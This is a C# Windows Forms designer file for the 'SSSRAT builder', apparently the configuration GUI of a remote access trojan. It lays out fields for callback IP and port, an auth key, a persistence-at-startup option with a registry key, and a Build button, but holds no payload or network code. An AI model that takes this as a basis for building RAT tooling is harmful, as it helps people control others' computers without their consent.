namespace SSSRAT_builder {
	partial class frm_build {
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.IContainer components = null;

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		protected override void Dispose(bool disposing) {
			if (disposing && (components != null)) {
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		#region Windows Form Designer generated code

		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent() {
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frm_build));
			this.pictureBox1 = new System.Windows.Forms.PictureBox();
			this.chk_startup = new System.Windows.Forms.CheckBox();
			this.t_startupKey = new System.Windows.Forms.TextBox();
			this.b_build = new System.Windows.Forms.Button();
			this.t_IP = new System.Windows.Forms.TextBox();
			this.label1 = new System.Windows.Forms.Label();
			this.label2 = new System.Windows.Forms.Label();
			this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
			this.pictureBox2 = new System.Windows.Forms.PictureBox();
			this.label3 = new System.Windows.Forms.Label();
			this.textBox1 = new System.Windows.Forms.TextBox();
			((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
			((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
			((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
			this.SuspendLayout();
			// 
			// pictureBox1
			// 
			this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
			this.pictureBox1.Location = new System.Drawing.Point(12, 9);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new System.Drawing.Size(178, 258);
			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 0;
			this.pictureBox1.TabStop = false;
			// 
			// chk_startup
			// 
			this.chk_startup.AutoSize = true;
			this.chk_startup.Location = new System.Drawing.Point(196, 12);
			this.chk_startup.Name = "chk_startup";
			this.chk_startup.Size = new System.Drawing.Size(60, 17);
			this.chk_startup.TabIndex = 1;
			this.chk_startup.Text = "Startup";
			this.chk_startup.UseVisualStyleBackColor = true;
			this.chk_startup.CheckedChanged += new System.EventHandler(this.CheckBox1CheckedChanged);
			// 
			// t_startupKey
			// 
			this.t_startupKey.Enabled = false;
			this.t_startupKey.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(186)));
			this.t_startupKey.ForeColor = System.Drawing.Color.Gray;
			this.t_startupKey.Location = new System.Drawing.Point(262, 9);
			this.t_startupKey.Name = "t_startupKey";
			this.t_startupKey.Size = new System.Drawing.Size(152, 20);
			this.t_startupKey.TabIndex = 2;
			this.t_startupKey.Text = "Startup key";
			this.t_startupKey.Enter += new System.EventHandler(this.TStartupKeyEnter);
			this.t_startupKey.Leave += new System.EventHandler(this.TStartupKeyLeave);
			// 
			// b_build
			// 
			this.b_build.Location = new System.Drawing.Point(196, 244);
			this.b_build.Name = "b_build";
			this.b_build.Size = new System.Drawing.Size(218, 23);
			this.b_build.TabIndex = 3;
			this.b_build.Text = "Build";
			this.b_build.UseVisualStyleBackColor = true;
			this.b_build.Click += new System.EventHandler(this.BBuildClick);
			// 
			// t_IP
			// 
			this.t_IP.Location = new System.Drawing.Point(222, 35);
			this.t_IP.Name = "t_IP";
			this.t_IP.Size = new System.Drawing.Size(192, 20);
			this.t_IP.TabIndex = 4;
			this.t_IP.Text = "127.0.0.1";
			this.t_IP.Leave += new System.EventHandler(this.TIPLeave);
			// 
			// label1
			// 
			this.label1.AutoSize = true;
			this.label1.Location = new System.Drawing.Point(196, 38);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(20, 13);
			this.label1.TabIndex = 5;
			this.label1.Text = "IP:";
			// 
			// label2
			// 
			this.label2.AutoSize = true;
			this.label2.Location = new System.Drawing.Point(196, 63);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(29, 13);
			this.label2.TabIndex = 6;
			this.label2.Text = "Port:";
			// 
			// numericUpDown1
			// 
			this.numericUpDown1.Location = new System.Drawing.Point(231, 61);
			this.numericUpDown1.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
			this.numericUpDown1.Name = "numericUpDown1";
			this.numericUpDown1.Size = new System.Drawing.Size(183, 20);
			this.numericUpDown1.TabIndex = 7;
			this.numericUpDown1.Value = new decimal(new int[] {
            13337,
            0,
            0,
            0});
			// 
			// pictureBox2
			// 
			this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
			this.pictureBox2.Location = new System.Drawing.Point(231, 114);
			this.pictureBox2.Name = "pictureBox2";
			this.pictureBox2.Size = new System.Drawing.Size(149, 124);
			this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox2.TabIndex = 8;
			this.pictureBox2.TabStop = false;
			// 
			// label3
			// 
			this.label3.AutoSize = true;
			this.label3.Location = new System.Drawing.Point(196, 90);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(55, 13);
			this.label3.TabIndex = 9;
			this.label3.Text = "Auth key: ";
			// 
			// textBox1
			// 
			this.textBox1.Location = new System.Drawing.Point(257, 87);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new System.Drawing.Size(157, 20);
			this.textBox1.TabIndex = 10;
			// 
			// frm_build
			// 
			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(32)))), ((int)(((byte)(64)))));
			this.ClientSize = new System.Drawing.Size(426, 279);
			this.Controls.Add(this.textBox1);
			this.Controls.Add(this.label3);
			this.Controls.Add(this.pictureBox2);
			this.Controls.Add(this.numericUpDown1);
			this.Controls.Add(this.label2);
			this.Controls.Add(this.label1);
			this.Controls.Add(this.t_IP);
			this.Controls.Add(this.b_build);
			this.Controls.Add(this.t_startupKey);
			this.Controls.Add(this.chk_startup);
			this.Controls.Add(this.pictureBox1);
			this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			this.Name = "frm_build";
			this.Text = "SSSRAT builder";
			((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
			((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
			((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();

		}

		#endregion

		private System.Windows.Forms.PictureBox pictureBox1;
		private System.Windows.Forms.CheckBox chk_startup;
		private System.Windows.Forms.TextBox t_startupKey;
		private System.Windows.Forms.Button b_build;
		private System.Windows.Forms.TextBox t_IP;
		private System.Windows.Forms.Label label1;
		private System.Windows.Forms.Label label2;
		private System.Windows.Forms.NumericUpDown numericUpDown1;
		private System.Windows.Forms.PictureBox pictureBox2;
		private System.Windows.Forms.Label label3;
		private System.Windows.Forms.TextBox textBox1;
	}
}

